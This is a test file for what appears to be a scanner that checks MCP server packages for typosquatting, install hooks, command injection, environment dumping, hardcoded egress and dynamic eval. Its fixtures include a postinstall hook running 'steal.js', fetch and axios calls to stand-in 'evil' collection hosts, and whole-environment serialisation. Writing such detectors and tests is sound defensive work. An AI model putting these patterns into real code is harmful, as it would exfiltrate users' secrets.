import { describe, expect, it } from 'vitest';
import { typosquatRule } from '../src/rules/source/typosquat.js';
import { installScriptsRule } from '../src/rules/source/install-scripts.js';
import { commandInjectionRule } from '../src/rules/source/command-injection.js';
import { envExfiltrationRule } from '../src/rules/source/env-exfiltration.js';
import { hardcodedEgressRule } from '../src/rules/source/egress.js';
import { dynamicEvalRule } from '../src/rules/source/dynamic-eval.js';
import { extractPackageName, editDistance, stripVersion } from '../src/rules/source/pkg-name.js';
import { context, source, sourceContext } from './helpers.js';

describe('package-name extraction', () => {
  it('extracts the package from an npx invocation, stripping version', () => {
    const s = context({ command: 'npx', args: ['-y', '@modelcontextprotocol/server-github@1.2.3'] }, []).server;
    expect(extractPackageName(s)).toBe('@modelcontextprotocol/server-github');
  });

  it('returns null for a local-file server', () => {
    const s = context({ command: 'node', args: ['./dist/index.js'] }, []).server;
    expect(extractPackageName(s)).toBeNull();
  });

  it('strips versions for scoped and unscoped specs', () => {
    expect(stripVersion('lodash@4.17.21')).toBe('lodash');
    expect(stripVersion('@scope/pkg@2.0.0')).toBe('@scope/pkg');
    expect(stripVersion('@scope/pkg')).toBe('@scope/pkg');
  });

  it('computes edit distance', () => {
    expect(editDistance('lodash', 'lodahs')).toBe(2);
    expect(editDistance('axios', 'axois')).toBe(2);
    expect(editDistance('express', 'expres')).toBe(1);
  });
});

describe('MCP-S001 typosquat', () => {
  it('flags a one-off lookalike of a popular package', async () => {
    const ctx = context({ command: 'npx', args: ['-y', 'expres'] }, []);
    const findings = await typosquatRule.check(ctx);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.message).toContain('express');
  });

  it('does not flag the genuine popular package', async () => {
    const ctx = context({ command: 'npx', args: ['-y', 'express'] }, []);
    expect(await typosquatRule.check(ctx)).toEqual([]);
  });

  it('does not flag an unrelated package', async () => {
    const ctx = context({ command: 'npx', args: ['-y', 'some-unrelated-tool'] }, []);
    expect(await typosquatRule.check(ctx)).toEqual([]);
  });
});

describe('MCP-S002 install scripts', () => {
  it('flags a postinstall script', async () => {
    const ctx = sourceContext({}, source({}, { scripts: { build: 'tsc', postinstall: 'node steal.js' } }));
    const findings = await installScriptsRule.check(ctx);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.evidence).toContain('postinstall');
  });

  it('does not flag ordinary build/test scripts', async () => {
    const ctx = sourceContext({}, source({}, { scripts: { build: 'tsc', test: 'vitest' } }));
    expect(await installScriptsRule.check(ctx)).toEqual([]);
  });
});

describe('MCP-S003 command injection', () => {
  it('flags exec() with an interpolated template literal', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'const {exec}=require("child_process"); exec(`ls ${p}`);' }));
    const findings = await commandInjectionRule.check(ctx);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.location?.line).toBe(1);
  });

  it('flags exec() with string concatenation', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'exec("ls " + userPath);' }));
    expect(await commandInjectionRule.check(ctx)).toHaveLength(1);
  });

  it('does not flag exec() with a constant string', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'exec("ls -la");' }));
    expect(await commandInjectionRule.check(ctx)).toEqual([]);
  });

  it('does not flag execFile with an args array', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'execFile("ls", ["-la", p]);' }));
    expect(await commandInjectionRule.check(ctx)).toEqual([]);
  });
});

describe('MCP-S004 env exfiltration', () => {
  it('flags JSON.stringify(process.env)', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'const p = JSON.stringify(process.env);' }));
    expect(await envExfiltrationRule.check(ctx)).toHaveLength(1);
  });

  it('flags a spread of the whole environment', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'const all = {...process.env};' }));
    expect(await envExfiltrationRule.check(ctx)).toHaveLength(1);
  });

  it('does not flag reading a specific env var', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'const k = process.env.API_KEY;' }));
    expect(await envExfiltrationRule.check(ctx)).toEqual([]);
  });
});

describe('MCP-S005 hardcoded egress', () => {
  it('flags a fetch to an external host', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'fetch("https://evil.example.com/collect");' }));
    const findings = await hardcodedEgressRule.check(ctx);
    expect(findings).toHaveLength(1);
    expect(findings[0]?.message).toContain('evil.example.com');
  });

  it('does not flag a localhost URL', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'fetch("http://localhost:3000/health");' }));
    expect(await hardcodedEgressRule.check(ctx)).toEqual([]);
  });

  it('does not flag a URL passed to a non-network call (logger / message)', async () => {
    const ctx = sourceContext({}, source({
      'x.js': 'console.warn("see https://example.com/docs for details"); throw new Error("visit https://help.example.com");',
    }));
    expect(await hardcodedEgressRule.check(ctx)).toEqual([]);
  });

  it('flags a URL passed to a member network sink like axios.get', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'axios.get("https://collector.evil.example.com/x");' }));
    expect(await hardcodedEgressRule.check(ctx)).toHaveLength(1);
  });
});

describe('MCP-S006 dynamic eval', () => {
  it('flags eval()', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'const f = eval(userCode);' }));
    expect(await dynamicEvalRule.check(ctx)).toHaveLength(1);
  });

  it('flags new Function()', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'const f = new Function("return " + x);' }));
    expect(await dynamicEvalRule.check(ctx)).toHaveLength(1);
  });

  it('flags require() with a computed argument', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'const m = require("plugins/" + name);' }));
    expect(await dynamicEvalRule.check(ctx)).toHaveLength(1);
  });

  it('does not flag a static require', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'const fs = require("fs");' }));
    expect(await dynamicEvalRule.check(ctx)).toEqual([]);
  });

  it('does not flag namesake METHOD calls like sap.ui.require or fn.eval', async () => {
    const ctx = sourceContext({}, source({
      'x.js': 'sap.ui.require(["a/b"], function () {}); obj.eval(code); loader.import(name);',
    }));
    expect(await dynamicEvalRule.check(ctx)).toEqual([]);
  });

  it('does not flag require() with an array/object literal argument', async () => {
    const ctx = sourceContext({}, source({ 'x.js': 'require(["dep-a", "dep-b"]);' }));
    expect(await dynamicEvalRule.check(ctx)).toEqual([]);
  });
});

describe('source rules no-op without source', () => {
  it('AST rules return nothing when ctx.source is absent', async () => {
    const ctx = context({ command: 'npx', args: ['-y', 'express'] }, []);
    expect(await commandInjectionRule.check(ctx)).toEqual([]);
    expect(await envExfiltrationRule.check(ctx)).toEqual([]);
    expect(await dynamicEvalRule.check(ctx)).toEqual([]);
    expect(await hardcodedEgressRule.check(ctx)).toEqual([]);
    expect(await installScriptsRule.check(ctx)).toEqual([]);
  });
});
